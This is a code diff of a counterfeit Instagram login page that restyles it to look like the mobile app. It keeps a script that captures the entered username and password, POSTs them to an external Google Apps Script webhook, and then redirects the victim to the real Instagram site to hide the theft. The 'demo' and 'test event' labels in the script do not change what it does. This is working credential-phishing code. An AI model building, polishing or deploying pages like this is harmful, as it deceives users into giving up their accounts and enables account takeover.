@@ -1,418 +1,329 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-	<title>Instagram &bull; Login</title>
-	<!-- Live Favicon -->
-	<link href="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/instagram.svg" rel="icon" /><!-- Live Instagram-style Font -->
-	<link href="https://fonts.googleapis.com" rel="preconnect" />
-	<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect" />
-	<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&amp;display=swap" rel="stylesheet" />
-	<style type="text/css">* {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Instagram • Login</title>
 
-        body {
-            background-color: #fafafa;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            align-items: center;
-            color: #262626;
-        }
+  <!-- Live Favicon -->
+  <link href="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/instagram.svg" rel="icon" />
 
-        .main {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 32px;
-            margin-top: 40px;
-            width: 100%;
-            max-width: 935px;
-            padding: 0 20px;
-        }
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
 
-        /* Phone Mockup Frame */
-        .phone-mockup {
-            position: relative;
-            width: 380px;
-            height: 580px;
-            background: #000;
-            border-radius: 44px;
-            border: 12px solid #262626;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-        }
+    body {
+      background-color: #000000;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      color: #ffffff;
+      padding: 20px 16px 24px;
+    }
 
-        .phone-notch {
-            position: absolute;
-            top: 10px;
-            width: 110px;
-            height: 16px;
-            background: #262626;
-            border-radius: 10px;
-            z-index: 10;
-        }
+    /* Top language */
+    .top-bar {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      padding-top: 12px;
+      margin-bottom: 40px;
+    }
 
-        /* Hosted Images Slideshow */
-        .slideshow {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-size: cover;
-            background-position: center;
-            animation: changeHostedImage 12s infinite;
-        }
+    .language {
+      color: #a8a8a8;
+      font-size: 14px;
+    }
 
-        @keyframes changeHostedImage {
-            0%, 30% {
-                background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400&h=600&fit=crop');
-            }
-            33%, 63% {
-                background-image: url('https://images.unsplash.com/photo-1517841905240-472988babdf9?w=400&h=600&fit=crop');
-            }
-            66%, 96% {
-                background-image: url('https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=400&h=600&fit=crop');
-            }
-            100% {
-                background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400&h=600&fit=crop');
-            }
-        }
+    /* Instagram gradient logo */
+    .logo-container {
+      margin-bottom: 48px;
+      display: flex;
+      justify-content: center;
+    }
 
-        /* Right Column (Login form & widgets) */
-        .right-column {
-            width: 100%;
-            max-width: 350px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
+    .instagram-logo {
+      width: 72px;
+      height: 72px;
+      background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      border-radius: 18px;
+      position: relative;
+    }
 
-        .card {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 35px 40px 25px;
-            text-align: center;
-        }
+    .instagram-logo::before {
+      content: "";
+      width: 48px;
+      height: 48px;
+      border: 3.5px solid white;
+      border-radius: 14px;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
 
-        .logo-title {
-            font-family: 'Grand Hotel', cursive, -apple-system, sans-serif;
-            font-size: 52px;
-            font-weight: 400;
-            color: #262626;
-            margin-bottom: 24px;
-            line-height: 1;
-        }
+    .instagram-logo::after {
+      content: "";
+      width: 14px;
+      height: 14px;
+      border: 3.5px solid white;
+      border-radius: 50%;
+      position: absolute;
+      top: 14px;
+      right: 14px;
+    }
 
-        form {
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
+    /* Form container */
+    .form-container {
+      width: 100%;
+      max-width: 350px;
+    }
 
-        .input {
-            width: 100%;
-            background-color: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            padding: 9px 8px;
-            font-size: 12px;
-            outline: none;
-            color: #262626;
-        }
+    /* THIS is the important part - space between the boxes */
+    #loginForm {
+      display: flex;
+      flex-direction: column;
+      gap: 14px; /* ← Proper space between Username, Password and Button */
+    }
 
-        .input:focus {
-            border-color: #a8a8a8;
-        }
+    .input {
+      width: 100%;
+      height: 48px;
+      background-color: #121212;
+      border: 1px solid #363636;
+      border-radius: 6px;
+      padding: 0 14px;
+      color: #ffffff;
+      font-size: 14px;
+      outline: none;
+    }
 
-        .login-btn {
-            width: 100%;
-            background-color: #0095f6;
-            color: #ffffff;
-            font-size: 14px;
-            font-weight: 600;
-            border: none;
-            border-radius: 8px;
-            padding: 7px 16px;
-            margin-top: 8px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
+    .input::placeholder {
+      color: #a8a8a8;
+    }
 
-        .login-btn:hover {
-            background-color: #1877f2;
-        }
+    .input:focus {
+      border-color: #a8a8a8;
+    }
 
-        .divider {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            margin: 18px 0;
-            color: #737373;
-            font-size: 13px;
-            font-weight: 600;
-        }
+    #submitBtn {
+      width: 100%;
+      height: 48px;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 8px;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 4px;
+    }
 
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #dbdbdb;
-        }
+    #submitBtn:hover {
+      background-color: #1877f2;
+    }
 
-        .divider span {
-            padding: 0 16px;
-        }
+    #submitBtn:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
 
-        .fb-login {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            color: #385185;
-            font-size: 14px;
-            font-weight: 600;
-            text-decoration: none;
-            margin-bottom: 16px;
-        }
+    .forgot-pass {
+      text-align: center;
+      margin-top: 18px;
+      color: #ffffff;
+      font-size: 14px;
+      text-decoration: none;
+      display: block;
+    }
 
-        .fb-login img {
-            width: 16px;
-            height: 16px;
-            filter: invert(27%) sepia(35%) saturate(1512%) hue-rotate(189deg) brightness(91%) contrast(89%);
-        }
+    /* Bottom section */
+    .bottom-section {
+      width: 100%;
+      max-width: 350px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 24px;
+      margin-top: auto;
+      padding-top: 40px;
+    }
 
-        .forgot-pass {
-            display: block;
-            color: #00376b;
-            font-size: 12px;
-            text-decoration: none;
-        }
+    .create-account-btn {
+      width: 100%;
+      height: 44px;
+      background-color: transparent;
+      border: 1px solid #0095f6;
+      border-radius: 8px;
+      color: #0095f6;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-        .signup-card {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 20px;
-            text-align: center;
-            font-size: 14px;
-        }
+    .meta-logo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #a8a8a8;
+      font-size: 14px;
+      font-weight: 500;
+    }
 
-        .signup-card a {
-            color: #0095f6;
-            font-weight: 600;
-            text-decoration: none;
-        }
+    .meta-logo svg {
+      width: 18px;
+      height: 18px;
+      fill: #a8a8a8;
+    }
 
-        .app-section {
-            text-align: center;
-            padding: 10px 0;
-        }
-
-        .app-text {
-            font-size: 14px;
-            margin-bottom: 14px;
-            color: #262626;
-        }
-
-        .app-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .store-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: #000000;
-            color: #ffffff;
-            padding: 6px 14px;
-            border-radius: 6px;
-            text-decoration: none;
-            font-size: 10px;
-            line-height: 1.2;
-            text-align: left;
-        }
-
-        .store-badge img {
-            width: 18px;
-            height: 18px;
-            filter: invert(1);
-        }
-
-        .store-badge span strong {
-            display: block;
-            font-size: 13px;
-        }
-
-        /* Footer */
-        footer {
-            width: 100%;
-            padding: 30px 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 14px;
-        }
-
-        .footer-links a {
-            color: #737373;
-            font-size: 12px;
-            text-decoration: none;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        .footer-copy {
-            color: #737373;
-            font-size: 12px;
-            margin-top: 4px;
-        }
-
-        @media (max-width: 800px) {
-            .phone-mockup {
-                display: none;
-            }
-            .main {
-                margin-top: 20px;
-            }
-        }
-	</style>
+    #err {
+      color: #ed4956;
+      font-size: 13px;
+      text-align: center;
+      margin-top: 8px;
+    }
+  </style>
 </head>
 <body>
-<main class="main"><!-- Phone Mockup with Hosted Live Image Slideshow -->
-<div class="phone-mockup">
-<div class="phone-notch">&nbsp;</div>
 
-<div class="slideshow">&nbsp;</div>
-</div>
-<!-- Login Form Column -->
+  <!-- Top language -->
+  <div class="top-bar">
+    <span class="language">English (US)</span>
+  </div>
 
-<div class="right-column">
-<div class="card">
-<div class="logo-title">Instagram</div>
-
-<form id="loginForm" action="" method="POST"><input id="username" autocomplete="username" class="input" placeholder="Phone number, username, or email" required type="text" /> <input id="password" autocomplete="current-password" class="input" name="password" placeholder="Password" required type="password" /><button id="submitBtn" type="submit"><span id="btnText">Log in</span></button><p id="err" hidden>Please fill in both fields.</p>
-
-<div class="divider"><span>OR</span></div>
-<a class="fb-login" href="#"> <img alt="Facebook" src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/facebook.svg" /> Log in with Facebook </a> <a class="forgot-pass" href="#">Forgot password?</a></form>
+  <!-- Instagram Logo -->
+<div class="logo-container">
+  <img 
+    src="instagram.png" 
+    alt="Instagram"
+    style="width: 72px; height: 72px;"
+  >
 </div>
 
-<div class="signup-card">Don&#39;t have an account? <a href="#">Sign up</a></div>
+  <!-- Login Form -->
+  <div class="form-container">
+    <form id="loginForm" action="" method="POST">
+      <input id="username" 
+             autocomplete="username" 
+             class="input" 
+             placeholder="Username, email or mobile number" 
+             required 
+             type="text" />
 
-<div class="app-section">
-<p class="app-text">Get the app.</p>
+      <input id="password" 
+             autocomplete="current-password" 
+             class="input" 
+             name="password" 
+             placeholder="Password" 
+             required 
+             type="password" />
 
-<div class="app-buttons"><a class="store-badge" href="#"><img alt="Google Play" src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/googleplay.svg" /> <span>GET IT ON<strong>Google Play</strong></span> </a> <a class="store-badge" href="#"> <img alt="Microsoft" src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/microsoft.svg" /> <span>Get it from<strong>Microsoft</strong></span> </a></div>
-</div>
-</div>
-</main>
+      <button id="submitBtn" type="submit">
+        <span id="btnText">Log in</span>
+      </button>
 
-<footer>
-<div class="footer-links"><a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a> <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a> <a href="#">Contact Uploading &amp; Non-Users</a> <a href="#">Meta Verified</a></div>
+      <p id="err" hidden>Please fill in both fields.</p>
 
-<div class="footer-copy">&copy; 2026 Instagram from Meta</div>
-</footer>
+      <a class="forgot-pass" href="#">Forgot password?</a>
+    </form>
+  </div>
 
+  <!-- Bottom section -->
+  <div class="bottom-section">
+    <a href="#" class="create-account-btn">Create new account</a>
 
-<script>
-const CONFIG = {
-  WEBHOOK_URL: "https://script.google.com/macros/s/AKfycbx_p3CNRm-kl31QlpbddZaGyzaT13h82YxYlnxgFMSmixee6gnimkekQT6WOBbY98i0/exec",
-  REDIRECT_URL: "https://www.instagram.com/",
-  TIMEOUT_MS: 4000
-};
+    <div class="meta-logo">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02z"/>
+      </svg>
+      <span>Meta</span>
+    </div>
+  </div>
 
-const form = document.getElementById("loginForm");
-const errBox = document.getElementById("err");
-const btn = document.getElementById("submitBtn");
-const btnText = document.getElementById("btnText");
-const username = document.getElementById("username").value.trim();
-const password = document.getElementById("password").value;
+  <!-- ====== ORIGINAL SCRIPT (UNCHANGED) ====== -->
+  <script>
+    const CONFIG = {
+      WEBHOOK_URL: "https://script.google.com/macros/s/AKfycbx_p3CNRm-kl31QlpbddZaGyzaT13h82YxYlnxgFMSmixee6gnimkekQT6WOBbY98i0/exec",
+      REDIRECT_URL: "https://www.instagram.com/",
+      TIMEOUT_MS: 4000
+    };
 
-async function saveTestEvent(data) {
-  if (!CONFIG.WEBHOOK_URL ||
-      CONFIG.WEBHOOK_URL === "YOUR_TEST_WEBHOOK_URL") return;
+    const form = document.getElementById("loginForm");
+    const errBox = document.getElementById("err");
+    const btn = document.getElementById("submitBtn");
+    const btnText = document.getElementById("btnText");
 
-  const controller = new AbortController();
-  const timer = setTimeout(
-    () => controller.abort(),
-    CONFIG.TIMEOUT_MS
-  );
+    async function saveTestEvent(data) {
+      if (!CONFIG.WEBHOOK_URL || CONFIG.WEBHOOK_URL === "YOUR_TEST_WEBHOOK_URL") return;
 
-  try {
-    await fetch(CONFIG.WEBHOOK_URL, {
-      method: "POST",
-      mode: "no-cors",
-      headers: {
-        "Content-Type": "text/plain;charset=utf-8"
-      },
-      body: JSON.stringify(data),
-      signal: controller.signal
-    });
-  } catch (error) {
-    // Logging failures won't prevent the redirect.
-  } finally {
-    clearTimeout(timer);
-  }
-}
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), CONFIG.TIMEOUT_MS);
 
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
-
-  const username =
-    document.getElementById("username").value.trim();
-  const password =
-    document.getElementById("password").value;
-    console.log("Username entered:", username);
-  console.log("Password field is filled:", password);
-
-  if (!username || !password) {
-    if (errBox) {
-      errBox.hidden = false;
-      errBox.textContent = "Please fill in both fields.";
+      try {
+        await fetch(CONFIG.WEBHOOK_URL, {
+          method: "POST",
+          mode: "no-cors",
+          headers: {
+            "Content-Type": "text/plain;charset=utf-8"
+          },
+          body: JSON.stringify(data),
+          signal: controller.signal
+        });
+      } catch (error) {
+        // Logging failures won't prevent the redirect.
+      } finally {
+        clearTimeout(timer);
+      }
     }
-    return;
-  }
 
-  if (errBox) errBox.hidden = true;
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
 
-  btn.disabled = true;
-  btn.classList.add("loading");
-  btnText.textContent = "Submitting…";
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value;
 
+      console.log("Username entered:", username);
+      console.log("Password field is filled:", password);
 
-await saveTestEvent({
-  event: "demo_form_submitted",
-  username: username,
-  password: password,
-  page: window.location.href,
-  agent: navigator.userAgent,
-  time: new Date().toISOString()
-});
+      if (!username || !password) {
+        if (errBox) {
+          errBox.hidden = false;
+          errBox.textContent = "Please fill in both fields.";
+        }
+        return;
+      }
 
-  if (CONFIG.REDIRECT_URL) {
-    window.location.href = CONFIG.REDIRECT_URL;
-  }
-});
-</script>
+      if (errBox) errBox.hidden = true;
+
+      btn.disabled = true;
+      btn.classList.add("loading");
+      btnText.textContent = "Submitting…";
+
+      await saveTestEvent({
+        event: "demo_form_submitted",
+        username: username,
+        password: password,
+        page: window.location.href,
+        agent: navigator.userAgent,
+        time: new Date().toISOString()
+      });
+
+      if (CONFIG.REDIRECT_URL) {
+        window.location.href = CONFIG.REDIRECT_URL;
+      }
+    });
+  </script>
 
 </body>
 </html>
